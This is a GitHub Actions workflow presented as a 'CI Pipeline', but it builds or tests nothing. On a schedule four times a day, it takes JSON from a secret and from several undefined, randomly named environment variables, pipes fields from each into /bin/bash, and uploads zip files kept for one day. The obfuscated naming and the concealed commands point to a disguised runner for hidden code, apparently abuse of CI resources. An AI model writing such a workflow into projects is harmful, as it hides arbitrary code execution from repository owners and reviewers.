name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '13 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          i636: ${{ secrets.i636 }}
        run: |
          printf '%s' "$i636" | jq -r .zzmdc59423 | /bin/bash
          printf '%s' "$gcg73" | jq -r .ar5 | /bin/bash
          printf '%s' "$phxl16064" | jq -r .l26727 | /bin/bash
          printf '%s' "$k28" | jq -r .dll4966 | /bin/bash
          echo $myv037 | jq -r .bj2411 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: TCfixsAv
          path: "*.zip"
          retention-days: 1
